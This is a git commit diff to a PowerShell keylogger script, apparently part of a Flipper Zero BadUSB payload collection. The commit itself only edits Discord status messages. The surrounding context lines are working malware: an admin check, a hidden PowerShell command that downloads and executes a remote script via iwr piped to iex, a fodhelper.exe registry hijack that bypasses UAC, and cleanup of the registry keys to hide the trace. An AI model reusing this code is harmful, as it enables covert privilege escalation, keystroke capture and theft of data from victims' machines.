f7f2b14736ecce25da0613304102eeda247ed3f9
legiac <121451323+legiac@users.noreply.github.com>
2022-12-27 19:01:01 +0100

    Update keylogger.ps1

--- keylogger.ps1
+++ keylogger.ps1
@@ -33,13 +33,12 @@ function s1 {
 	$user = "$env:COMPUTERNAME\$env:USERNAME"
 	$isAdmin = (Get-LocalGroupMember 'Administrators').Name -contains $user
 if($isAdmin){
-	Upload-Discord -text "User is admin"
 	$259="powershell.exe -w h iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/s2.ps1 | iex";
 	reg add "HKCU\Software\Classes\.259\Shell\Open\command" /d $259 /f;reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".259" /f;fodhelper.exe;Start-Sleep -s 3;reg delete "HKCU\Software\Classes\.259\" /f;reg delete "HKCU\Software\Classes\ms-settings\" /f;
 
 	}
 	else{
-	Upload-Discord -text "User is NOT admin"
+	Upload-Discord -text "User is not admin"
 	Break
 	}
 }
